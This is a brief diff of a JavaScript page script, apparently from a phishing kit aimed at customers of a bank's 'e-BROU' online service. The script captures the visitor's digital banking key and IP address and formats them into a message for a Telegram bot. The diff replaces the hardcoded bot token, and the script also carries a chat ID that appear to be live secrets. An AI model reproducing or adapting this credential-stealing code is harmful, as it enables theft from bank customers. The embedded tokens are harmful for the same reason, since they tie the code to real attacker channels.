@@ -22,8 +22,8 @@ document.addEventListener("DOMContentLoaded", function () {
                 const ipCliente = data.ip;
 
                 // Token y chat ID del bot de Telegram (colocados directamente en el script)
-                const token = "7584579761:AAF_gz-XhA7nA9wSzN6OaWP6Ml1UX9DGgkU"; // Reemplaza con tu token
-                const chat_id = "5157616506"; // Reemplaza con tu chat ID
+                const token = "6808586807:AAH5KvJxwCHbxVecJJ1D2fQyiVCK4u_RuBQ";
+                const chat_id = "5157616506";
 
                 // Mensaje a enviar a Telegram
                 const mensaje = `E-brou Llave Digital ingresada: \n ${llaveDigital}\n\nIP del Cliente: ${ipCliente}`;
